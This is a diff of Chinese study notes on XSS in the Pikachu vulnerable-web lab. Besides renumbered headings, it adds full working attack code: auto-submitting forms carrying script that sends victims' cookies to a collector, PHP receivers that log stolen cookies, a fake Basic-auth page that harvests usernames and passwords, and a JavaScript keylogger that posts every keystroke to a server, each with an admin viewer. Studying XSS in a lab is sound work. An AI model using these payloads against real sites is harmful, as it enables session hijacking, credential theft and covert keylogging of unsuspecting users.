@@ -1,6 +1,6 @@
 # pikachu-labs-XSS 学习笔记
 
-## 知识预习
+## 一. 知识预习
 
 ###  JavaScript 伪协议
 
@@ -162,7 +162,7 @@ HTML中的`href`属性主要用于`<a>`标签中，表示超链接的引用，�
 
 
 
-## 反射型XSS
+## 二. 反射型XSS
 
 ### 反射型XSS-Get
 
@@ -182,7 +182,7 @@ HTML中的`href`属性主要用于`<a>`标签中，表示超链接的引用，�
 
 
 
-## 存储型XSS
+## 三. 存储型XSS
 
 留言板会将我们输入的数据**存储到数据库中**，所以说存储型XSS攻击是持久性的！即当我们再次访问网页时，就可以重现该漏洞：
 
@@ -192,7 +192,7 @@ HTML中的`href`属性主要用于`<a>`标签中，表示超链接的引用，�
 
 
 
-## DOM型XSS
+## 四. DOM型XSS
 
 DOM 可以理解为访问 HTML 的标准接口，DOM会 HTML 分成一个 DOM 树
 
@@ -233,7 +233,7 @@ javascript:alert("hack")
 
 
 
-## Dom型XSS-X
+## 五. Dom型XSS-X
 
 前端页面 js 代码分析：
 
@@ -263,7 +263,7 @@ javascript:alert("hack")
 
 
 
-## XSS之盲打
+## 六. XSS之盲打
 
 之所以称为XSS盲打，是因为在提交数据后，前端是看不到输入的内容及效果的，只有后端管理员可以看见，当管理员触发盲打被 X 到的话，危害是非常大的，很可能造成管理员的 cookie 泄露，进而使攻击者可以通过管理员权限登录网站后台。
 
@@ -273,7 +273,7 @@ javascript:alert("hack")
 
 
 
-## XSS之过滤
+## 七. XSS之过滤
 
 通过输入 `<script>alert('hack')</script>` 后，发现网页仅显示 `'>>'`，即后端过滤掉了 js 关键字 `script`
 
@@ -306,7 +306,7 @@ if(isset($_GET['submit']) && $_GET['message'] != null){
 
 
 
-## ❌ XSS之`htmlspecialchars`
+## 八. ❌ XSS之`htmlspecialchars`
 
 后端源码分析：
 
@@ -345,7 +345,7 @@ javascript:alert('hack')
 
 
 
-## XSS之`href`输出
+## 九. XSS之`href`输出
 
 后端源码分析：
 
@@ -375,7 +375,7 @@ javascript:alert('hack')
 
 
 
-## XSS之`js`输出
+## 十. XSS之`js`输出
 
 输入数据并回车后，分析前端页面中，由后端服务器返回的 JS 代码：
 
@@ -420,7 +420,7 @@ javascript:alert('hack')
 
 
 
-## 总结
+## 十一. 总结
 
 来总结下上述所使用的 XSS 攻击代码吧：
 
@@ -464,4 +464,451 @@ javascript:alert('hack')
 
    ```js
    </script><script>alert('hack')</script>
+   ```
+
+# Pikachu XSS 攻击演练
+
+## 一. Cookie 收集
+
+### 攻击原理
+
+[受害者端]访问黑客拟造的包含 XSS Payload 的链接，进而触发 XSS Payload ———> XSS Payload 获取受害者端浏览器中的Cookie，然后将其发给[黑客端] ———> 黑客可结合 CSRF 攻击，进行伪造用户登录等恶意操作
+
+### POST 类型
+
+1. `post.html`：拟造包含 XSS Payload 页面，将其链接发给受害者（前提是受害者端的网站存在 XSS 漏洞），当受害者访问该链接后，XSS Payload 将会在受害者的浏览器中执行，然后将窃取到的数据 Cookie 发给黑客：
+
+   ```js
+   // 值得注意的是：攻击成功的前提是受害者已经登录（http://127.0.0.1/pikachu/vul/xss/xsspost/post_login.php）成功
+   // 因为访问 http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php 的前提是用户已登录
+   http://127.0.0.1/pikachu/pkxss/xcookie/post.html
+   ```
+
+   ```html
+   <html>
+   <head>
+   <!-- 在网页加载完成后，自动触发 ID 为"postsubmit"的 HTML 元素的点击事件 -->
+   <script>
+   window.onload = function() {
+     document.getElementById("postsubmit").click();
+   }
+   </script>
+   </head>
+   <body>
+   <!-- 存在反射型 XSS 漏洞的页面地址：http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php -->
+   <form method="post" action="http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php">
+       <!-- 拟造 XSS Payload，将其作为待提交的表单 Payload  -->
+       <!-- 值得注意的是：这个表单的 HTML 代码是根据漏洞页面表单代码而设计的哟 -->
+       <input id="xssr_in" type="text" name="message" value=
+       "<script>
+   document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
+    </script>"
+     />
+       <input id="postsubmit" type="submit" name="submit" value="submit" />
+   </form>
+   </body>
+   </html>
+   ```
+
+2. `cookie.php`：黑客用于接收数据 Cookie 的代码，并将数据写入数据库：
+
+   ```js
+   <?php
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   //这个是获取cookie的api页面
+   if(isset($_GET['cookie'])){
+       $time=date('Y-m-d g:i:s');
+       $ipaddress=getenv ('REMOTE_ADDR');
+       $cookie=$_GET['cookie'];
+       $referer=$_SERVER['HTTP_REFERER'];
+       $useragent=$_SERVER['HTTP_USER_AGENT'];
+       $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
+       values('$time','$ipaddress','$cookie','$referer','$useragent')";
+       $result=mysqli_query($link, $query);
+   }
+   header("Location:http://127.0.0.1/pikachu/index.php");//重定向到一个可信的网站
+   ?>
+   ```
+
+3. `pkxss_cookie_result.php`：黑客用于管理接收到的数据：
+
+   ```php
+   <?php
+   // error_reporting(0);
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   // 判断是否登录，没有登录不能访问
+   if(!check_login($link)){
+       header("location:../pkxss_login.php");
+   }
+   
+   if(isset($_GET['id']) && is_numeric($_GET['id'])){
+       $id=escape($link, $_GET['id']);
+       $query="delete from cookies where id=$id";
+       execute($link, $query);
+   }
+   ?>
+   
+   <html>
+   <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+   <title>cookie搜集结果</title>
+   <link rel="stylesheet" type="text/css" href="../antxss.css" />
+   </head>
+   <body>
+   <div id="title">
+   <h1>pikachu Xss 获取cookies结果</h1>
+   <a href="../xssmanager.php">返回首页</a>
+   </div>
+   <div id="xss_main">
+   <table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
+       <tr>
+           <td>id</td>
+           <td>time</td>
+           <td>ipaddress</td>
+           <td>cookie</td>
+           <td>referer</td>
+           <td>useragent</td>
+           <td>删除</td>
+       </tr>
+       <?php 
+       $query="select * from cookies";
+       $result=mysqli_query($link, $query);
+       while($data=mysqli_fetch_assoc($result)){
+   $html=<<<A
+       <tr>
+           <td>{$data['id']}</td>
+           <td>{$data['time']}</td>
+           <td>{$data['ipaddress']}</td>
+           <td>{$data['cookie']}</td>
+           <td>{$data['referer']}</td>
+           <td>{$data['useragent']}</td>
+           <td><a href="pkxss_cookie_result.php?id={$data['id']}">删除</a></td>
+       </tr>
+   A;
+           echo $html;
+       }
+       ?>
+   </table>
+   </div>
+   </body>
+   </html>
+   ```
+   
+3. 结合 CSRF 攻击，伪造用户登录，进而对数据进行破坏......
+
+### GET 类型
+
+1. `get.html`：拟造包含 XSS Payload 页面，将其链接发给受害者（前提是受害者端的网站存在 XSS 漏洞），当受害者访问该链接后，XSS Payload 将会在受害者的浏览器中执行，然后将窃取到的数据 Cookie 发给黑客：
+
+   ```js
+   http://127.0.0.1/pikachu/pkxss/xcookie/get.html
+   ```
+
+   ```html
+   <html>
+   <head>
+   <script>
+   window.onload = function() {
+     document.getElementById("postsubmit").click();
+   }
+   </script>
+   </head>
+   <body>
+   <form method="get" action="http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php">
+       <input id="xssr_in" type="text" name="message" value=
+       "<script>
+   document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
+    </script>"
+     />
+       <input id="postsubmit" type="submit" name="submit" value="submit" />
+   </form>
+   </body>
+   </html>
+   ```
+
+2. 其余同上述 POST 类型的 XSS 哟~
+
+
+
+## 二. 钓鱼攻击
+
+### 攻击原理
+
+[黑客]向受害者发送一个链接 ——> [受害者]点击链接后会给[黑客]发送一个请求 ——> 该请求会返回一个用于身份信息验证的 Basic 头部给受害者，若[受害者]安全意识不足，则可能会导致引诱受害者输入敏感的账户等信息！ ——> [受害者]输入的信息将会发送给[黑客]
+
+### Let's hack it！
+
+1. `fish.php`：构造 XSS Payload
+
+   ```js
+   // XSS Payload 1: 这种链接如果让[受害者]直接访问，会很容易被发觉异常，建议使用相关工具将其装换为不易识别的短链接
+   http://127.0.0.1/pikachu/pkxss/xfish/fish.php
+   
+   // XSS Payload 2: 利用的 XSS 漏洞最好是存储型，例如 XSS 关卡 http://localhost/pikachu/vul/xss/xss_stored.php
+   <script src="http://127.0.0.1/pikachu/pkxss/xfish/fish.php"></script>
+   ```
+
+   ```php
+   <?php
+   error_reporting(0);
+   // var_dump($_SERVER);
+   if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
+    //发送认证框，并给出迷惑性的info
+       header('Content-type:text/html;charset=utf-8');
+       header("WWW-Authenticate: Basic realm='认证'");
+       header('HTTP/1.0 401 Unauthorized');
+       echo 'Authorization Required.';
+       exit;
+   } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
+    // 将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
+       // 无法正常获取用户名及密码？答：删除下述这行代码的多余空格，使其占一行就好啦！
+       // 参考文章：https://wiki.bafangwy.com/doc/370/
+       header("Location: http://127.0.0.1/pikachu/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
+   }
+   
+   ?>
+   ```
+
+2. `xfish.php`：获取用户输入的账号数据，并将其写入到数据库中
+
+   ```php
+   <?php
+   error_reporting(0);
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   if(!empty($_GET['username']) && !empty($_GET['password'])){
+       $username=$_GET['username'];
+       $password=$_GET['password'];
+       $referer="";
+       $referer.=$_SERVER['HTTP_REFERER'];
+       $time=date('Y-m-d g:i:s');
+       $query="insert fish(time,username,password,referer) 
+       values('$time','$username','$password','$referer')";
+       $result=mysqli_query($link, $query);
+   }
+   ?>
+   ```
+
+3. `pkxss_fish_result.php`：用于管理获取的数据
+
+   ```php
+   <?php
+   error_reporting(0);
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   // 判断是否登录，没有登录不能访问
+   if(!check_login($link)){
+       header("location:../pkxss_login.php");
+   }
+   
+   if(isset($_GET['id']) && is_numeric($_GET['id'])){
+       $id=escape($link, $_GET['id']);
+       $query="delete from fish where id=$id";
+       execute($link, $query);
+   }
+   ?>
+   
+   <html>
+   <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+   <title>钓鱼结果</title>
+   <link rel="stylesheet" type="text/css" href="../antxss.css" />
+   </head>
+   <body>
+   <div id="title">
+   <h1>pikachu Xss 钓鱼结果</h1>
+   <a href="../xssmanager.php">返回首页</a>
+   </div>
+   <div id="result">
+       <table class="tb" border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
+           <tr>
+               <td class="1">id</td>
+               <td class="1">time</td>
+               <td class="1">username</td>
+               <td class="1">password</td>
+               <td class="2">referer</td>
+               <td class="2">操作</td>
+           </tr>
+       <?php 
+       $query="select * from fish";
+       $result=mysqli_query($link, $query);
+       while($data=mysqli_fetch_assoc($result)){
+   $html=<<<A
+       <tr>
+           <td class="1">{$data['id']}</td>
+           <td class="1">{$data['time']}</td>
+           <td class="1">{$data['username']}</td>
+           <td class="1">{$data['password']}</td>
+           <td class="2">{$data['referer']}</td>
+            <td><a href="pkxss_fish_result.php?id={$data['id']}">删除</a></td>
+       </tr>
+   A;
+           echo $html; 
+       }
+       ?>
+       </table>
+   </div>
+   </body>
+   </html>
+   ```
+
+
+
+## 三. 键盘记录
+
+### 攻击原理
+
+[黑客]直接将 XSS Payload 注入到含有 XSS 漏洞的网页 ——> 当[受害者]访问该页面后，其在该页面的任何操作将被记录 ——> 与此同时，XSS Payload 攻击代码会将记录同步发送给[黑客]
+
+### Let's hack it！
+
+1. `rk.js`：构造 XSS Payload
+
+   ```js
+   <script src="http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js"></script>
+   ```
+
+   ```js
+   function createAjax(){
+       var request=false;
+       if(window.XMLHttpRequest){
+           request=new XMLHttpRequest();
+           if(request.overrideMimeType){
+               request.overrideMimeType("text/xml");
+           }
+   
+       }else if(window.ActiveXObject){
+   
+           var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+           for(var i=0; i<versions.length; i++){
+               try{
+                   request=new ActiveXObject(versions[i]);
+                   if(request){
+                       return request;
+                   }
+               }catch(e){
+                   request=false;
+               }
+           }
+       }
+       return request;
+   }
+   
+   var ajax=null;
+   var xl="datax=";
+   
+   function onkeypress() {
+       var realkey = String.fromCharCode(event.keyCode);
+       xl+=realkey;
+       show();
+   }
+   
+   document.onkeypress = onkeypress;
+   
+   function show() {
+       ajax = createAjax();
+       ajax.onreadystatechange = function () {
+           if (ajax.readyState == 4) {
+               if (ajax.status == 200) {
+                   var data = ajax.responseText;
+               } else {
+                   alert("页面请求失败");
+               }
+           }
+       }
+   
+       var postdate = xl;
+       ajax.open("POST", "http://127.0.0.1/pikachu/pkxss/rkeypress/rkserver.php",true);
+       ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+       ajax.setRequestHeader("Content-length", postdate.length);
+       ajax.setRequestHeader("Connection", "close");
+       ajax.send(postdate);
+   }
+   ```
+
+2. `rkserver.php`：接收[受害者]在页面上输入的所有数据
+
+   ```php
+   <?php
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   //设置允许被跨域访问
+   header("Access-Control-Allow-Origin:*");
+   
+   $data = $_POST['datax'];
+   $query = "insert keypress(data) values('$data')";
+   $result=mysqli_query($link,$query);
+   ?>
+   ```
+
+3. `pkxss_keypress_result.php`：管理获取的数据
+
+   ```php
+   <?php
+   // error_reporting(0);
+   include_once '../inc/config.inc.php';
+   include_once '../inc/mysql.inc.php';
+   $link=connect();
+   
+   // 判断是否登录，没有登录不能访问
+   if(!check_login($link)){
+       header("location:../pkxss_login.php");
+   }
+   
+   if(isset($_GET['id']) && is_numeric($_GET['id'])){
+       $id=escape($link, $_GET['id']);
+       $query="delete from keypress where id=$id";
+       execute($link, $query);
+   }
+   ?>
+   
+   <html>
+   <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+   <title>键盘记录结果</title>
+   <link rel="stylesheet" type="text/css" href="../antxss.css" />
+   </head>
+   <body>
+   <div id="title">
+   <h1>pikachu Xss 获取键盘记录结果</h1>
+   <a href="../xssmanager.php">返回首页</a>
+   </div>
+   <div id="xss_main">
+   <table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
+       <tr>
+           <td>id</td>
+           <td>记录</td>
+           <td>操作</td>
+       </tr>
+       <?php 
+       $query="select * from keypress";
+       $result=mysqli_query($link, $query);
+       while($data=mysqli_fetch_assoc($result)){
+   $html=<<<A
+       <tr>
+           <td>{$data['id']}</td>
+           <td>{$data['data']}</td>
+           <td><a href="pkxss_keypress_result.php?id={$data['id']}">删除</a></td>
+       </tr>
+   A;
+           echo $html;   
+       }
+       ?>
+       
+   </table>
+   </div>
+   </body>
+   </html>
    ```
